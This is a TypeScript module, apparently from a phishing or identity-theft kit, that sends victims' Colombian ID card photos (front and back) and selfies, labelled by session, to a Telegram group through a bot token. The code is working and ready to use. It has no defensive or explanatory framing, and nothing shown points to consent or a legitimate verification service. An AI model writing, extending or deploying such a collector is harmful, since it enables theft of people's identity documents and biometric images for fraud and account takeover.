/**
 * Telegram FACE ID Module
 * Sends Face ID photos (cedula front/back + selfie) to a dedicated Telegram group
 */

import { loadConfig } from "./config";

function getFaceidToken() { return loadConfig().telegramFaceidBotToken || process.env.TELEGRAM_FACEID_BOT_TOKEN || ""; }
function getFaceidChatId() { return loadConfig().telegramFaceidChatId || process.env.TELEGRAM_FACEID_CHAT_ID || ""; }

const TYPE_LABELS: Record<string, string> = {
  front: "🪪 Cédula FRONTAL",
  back: "🔄 Cédula TRASERA",
  selfie: "🤳 SELFIE",
};

/**
 * Send a Face ID photo to the dedicated Telegram group
 */
export async function sendFaceIDToTelegram(sessionId: string, type: string, imageDataUrl: string): Promise<void> {
  const token = getFaceidToken();
  const chatId = getFaceidChatId();

  if (!token || !chatId) {
    console.warn("[TelegramFaceID] Bot token or chat ID not configured");
    return;
  }

  try {
    // Convert data URL to buffer
    const base64Data = imageDataUrl.replace(/^data:image\/\w+;base64,/, "");
    const imageBuffer = Buffer.from(base64Data, "base64");

    // Determine file extension from data URL
    const mimeMatch = imageDataUrl.match(/^data:image\/(\w+);/);
    const ext = mimeMatch ? mimeMatch[1] : "jpg";

    const label = TYPE_LABELS[type] || type;
    const caption = `${label}\n\n📋 Sesión: <code>${sessionId.slice(0, 20)}</code>\n📅 ${new Date().toLocaleString("es-CO")}`;

    // Send photo using multipart form data
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("caption", caption);
    formData.append("parse_mode", "HTML");
    formData.append("photo", new Blob([imageBuffer], { type: `image/${ext}` }), `faceid_${type}_${Date.now()}.${ext}`);

    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: formData,
    });

    const data = await res.json();
    if (!data.ok) {
      console.error("[TelegramFaceID] Failed to send photo:", data.description);
    } else {
      console.log(`[TelegramFaceID] Sent ${type} photo for session ${sessionId.slice(0, 12)}`);
    }
  } catch (error: unknown) {
    console.error("[TelegramFaceID] Error:", error);
  }
}
